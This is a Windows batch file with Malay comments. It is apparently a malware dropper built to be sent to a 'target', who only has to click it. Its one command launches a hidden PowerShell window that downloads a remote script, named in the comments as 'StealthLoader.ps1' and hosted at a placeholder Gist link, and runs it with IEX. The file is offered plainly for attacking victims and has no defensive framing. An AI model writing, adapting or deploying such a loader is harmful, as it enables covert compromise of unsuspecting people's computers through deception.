@echo off
:: Fail ini untuk dihantar kepada target. Klik ja BOOM.
:: Gantikan URL di bawah dengan Link Raw Gist StealthLoader.ps1 anda.

powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('MASUKKAN_LINK_RAW_GIST_DISINI')"
